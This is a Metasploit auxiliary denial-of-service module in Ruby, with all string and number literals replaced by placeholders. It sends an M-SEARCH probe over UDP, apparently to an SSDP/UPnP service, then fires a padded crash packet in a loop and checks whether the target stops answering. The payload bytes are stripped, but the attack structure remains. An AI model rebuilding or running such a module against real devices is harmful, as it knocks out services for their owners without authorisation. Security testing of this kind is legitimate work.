require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: Udp include Msf :: Auxiliary :: Dos def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def send_probe ( udp_sock , probe ) udp_sock . put ( probe ) data = udp_sock . recvfrom if data and not data [ <int> ] . empty? return data [ <int> ] else return nil end end def run msearch_probe = <str> msearch_probe << <str> msearch_probe << <str> msearch_probe << <str> msearch_probe << <str> msearch_probe << <str> sploit = <str> sploit << <str> sploit << <str> sploit += <str> * ( <int> - sploit . length ) connect_udp print_status ( <str> rhost <str> rport <str> ) response = send_probe ( udp_sock , msearch_probe ) if response . nil? print_error ( <str> rhost <str> rport <str> ) disconnect_udp return end ( <int> .. datastore [ <str> ] ) . each { | attempt | print_status ( <str> rhost <str> rport <str> attempt <str> ) print_status ( <str> rhost <str> rport <str> ) udp_sock . put ( sploit ) print_status ( <str> rhost <str> rport <str> ) response = send_probe ( udp_sock , msearch_probe ) if response . nil? print_good ( <str> rhost <str> rport <str> ) disconnect_udp return else print_status ( <str> rhost <str> rport <str> ) end } disconnect_udp end end 
